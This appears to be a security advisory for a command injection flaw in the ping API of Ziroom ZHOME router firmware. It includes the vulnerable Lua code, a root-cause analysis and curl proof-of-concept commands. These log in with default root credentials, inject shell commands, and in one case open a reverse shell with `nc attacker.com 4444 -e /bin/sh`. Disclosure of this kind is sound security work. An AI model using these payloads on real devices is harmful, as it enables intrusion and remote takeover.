# Command Injection Vulnerability in ZHOME ZH-A0101 ZRnetwork ping via `url`

## Overview

- **Vendor:** Ziroom
- **Product:** ZHOME-A0101
- **Firmware Version:** 1.0.1.0, Build 202004151405
- **Platform:** OpenWrt / MediaTek MT7621, MIPS32
- **Vulnerability Type:** Command Injection
- **Affected Endpoint:** `POST /api/ZRnetwork/ping`
- **Affected Parameter:** `url`
- **Authentication Requirement:** HTTP Basic Auth as `root`
- **Severity:** Critical

## Vulnerability Information

| Item                | Detail                                          |
| ------------------- | ----------------------------------------------- |
| Controller File     | `usr/lib/lua/luci/controller/api/zrNetwork.lua` |
| Model File          | `usr/lib/lua/luci/model/ZRapi/ZRLanWanFun.lua`  |
| Route Definition    | `zrNetwork.lua:71`                              |
| Controller Function | `ping()`                                        |
| Controller Location | line 1112-1122                                  |
| Model Function      | `ZRLanWanFun.ping()`                            |
| Model Location      | line 1146-1162                                  |
| Injection Location  | `ZRLanWanFun.lua:1153`                          |
| Sink                | `LuciUtil.execl()`                              |

## Vulnerable Code

Controller:

![image.png](https://cdn.nlark.com/yuque/0/2026/png/25400303/1785226108680-1e028242-a015-4825-a20d-37ac7f7c41f9.png?x-oss-process=image%2Fformat%2Cwebp)

```lua
function ping()
    local LuciHttp = require("luci.http")
    local url = LuciHttp.formvalue("url")
    local ZRWan = require("luci.model.ZRapi.ZRLanWanFun")
    local link = ZRWan.ping(url)
    local result = {}
    result["link"] = link
    luci.http.prepare_content("application/json")
    luci.http.write_json(result)
end
```

Model:

![image.png](https://cdn.nlark.com/yuque/0/2026/png/25400303/1785226147877-52a177d2-2422-47cf-a62e-ec73c3951dbf.png?x-oss-process=image%2Fformat%2Cwebp)

```lua
function ping(url)
    local result = {}
    local LuciUtil = require("luci.util")
    local ZRFunction = require("luci.model.ZRapi.common.ZRFunction")
    local ping
    local pingstr

    ping = LuciUtil.execl("ping "..url.." -c 1 -W 1 |grep avg")

    if not ZRFunction.isStrNil(ping[1]) then
        pingstr = ping[1]
        local mins, avg, maxs = string.match(
            pingstr,
            "([0-9]+%.*[0-9]*)/([0-9]+%.*[0-9]*)/([0-9]+%.*[0-9]*)"
        )
        return tostring(avg)
    end

    return 0
end
```

## Root Cause

The `url` parameter is taken directly from the HTTP request and concatenated into a shell command:

```sh
ping <url> -c 1 -W 1 |grep avg
```

Because the value is not validated or shell-escaped, command-substitution syntax such as `$()` can execute before `ping` runs.

## Source-to-Sink Chain

```text
POST /api/ZRnetwork/ping
    |
    v
LuciHttp.formvalue("url")
    |
    v
ZRWan.ping(url)
    |
    v
LuciUtil.execl("ping " .. url .. " -c 1 -W 1 |grep avg")
    |
    v
io.popen() / /bin/sh
```

## Harmless Verification Example

```bash
curl -s --noproxy "*" -c cookies.txt -X POST \
  "http://192.168.18.1/cgi-bin/luci" \
  -d "username=root&password=admin" -L -D headers.txt

STOK=$(grep stok headers.txt | sed 's/.*stok=//;s/\r//;s/\/.*//')

curl -s --noproxy "*" -b cookies.txt -X POST \
  --data-urlencode 'url=$(touch /tmp/vuln32)' \
  "http://192.168.18.1/cgi-bin/luci/;stok=${STOK}/api/ZRnetwork/ping"
```

Expected API behavior:

```json
{ "link": 0 }
```

The API can return `0` because the `ping` operation fails, while the command substitution has already executed.

## Impact

An authenticated attacker can execute arbitrary shell commands through the network diagnostic ping API. The command runs in the web management execution context, which is typically highly privileged on OpenWrt-based firmware.

## Injection Principle

Normal request:

```text
url = "192.168.1.1"
```

Concatenated command:

```sh
ping 192.168.1.1 -c 1 -W 1 |grep avg
```

Injection request:

```text
url = "$(touch /tmp/vuln32)"
```

Concatenated command:

```sh
ping $(touch /tmp/vuln32) -c 1 -W 1 |grep avg
```

Shell execution flow:

1. `$()` command substitution executes first: `touch /tmp/vuln32` → file created
2. `touch` returns an empty string
3. `ping` has no valid host argument → fails
4. But the injected command has already executed

Why `$()` instead of `;`:

```text
Using ";touch /tmp/vuln32":
  → ping ;touch /tmp/vuln32 -c 1 -W 1 |grep avg
  → Command 1: ping (no argument, reads from stdin, hangs)
  → Command 2 never executes (ping blocks)

Using "$()" command substitution:
  → ping $(touch /tmp/vuln32) -c 1 -W 1 |grep avg
  → $() executes first, touch completes immediately
  → ping fails but does not hang
```

## Exploit Chain

```text
Attacker
  │
  ├─ Step 1: Obtain root credentials
  │
  ├─ Step 2: Construct HTTP POST request
  │           URL:  /cgi-bin/luci/;stok=<STOK>/api/ZRnetwork/ping
  │           Body: url=$(<COMMAND>)
  │
  ├─ Step 3: LuciUtil.execl() executes via io.popen() → /bin/sh
  │           Command inside $() executes before ping
  │
  └─ Step 4: Command execution completes, API returns {"link": 0}
```

## Proof of Concept

```bash
# Obtain session token
curl -s --noproxy "*" -c cookies.txt -X POST \
  "http://192.168.18.1/cgi-bin/luci" \
  -d "username=root&password=admin" -L -D headers.txt

STOK=$(grep stok headers.txt | sed 's/.*stok=//;s/\r//;s/\/.*//')

# PoC 1: Create file
curl -s --noproxy "*" -b cookies.txt -X POST \
  --data-urlencode 'url=$(touch /tmp/vuln32)' \
  "http://192.168.18.1/cgi-bin/luci/;stok=${STOK}/api/ZRnetwork/ping"

# PoC 2: Execute arbitrary command and write result
curl -s --noproxy "*" -b cookies.txt -X POST \
  --data-urlencode 'url=$(id>/tmp/vuln32_id)' \
  "http://192.168.18.1/cgi-bin/luci/;stok=${STOK}/api/ZRnetwork/ping"

# PoC 3: Reverse shell
curl -s --noproxy "*" -b cookies.txt -X POST \
  --data-urlencode 'url=$(nc attacker.com 4444 -e /bin/sh)' \
  "http://192.168.18.1/cgi-bin/luci/;stok=${STOK}/api/ZRnetwork/ping"
```

## Real Device Verification

```text
Request:  POST /api/ZRnetwork/ping  url=$(touch /tmp/vuln32)
Response: { "link": 0 }
SSH verification: -rw-r--r-- 1 root root 0 Jul 28 15:48 /tmp/vuln32  ✅
```

![image.png](https://cdn.nlark.com/yuque/0/2026/png/25400303/1785226220464-c88fef6e-50e4-4c9b-b96e-2723e5673f03.png?x-oss-process=image%2Fformat%2Cwebp)
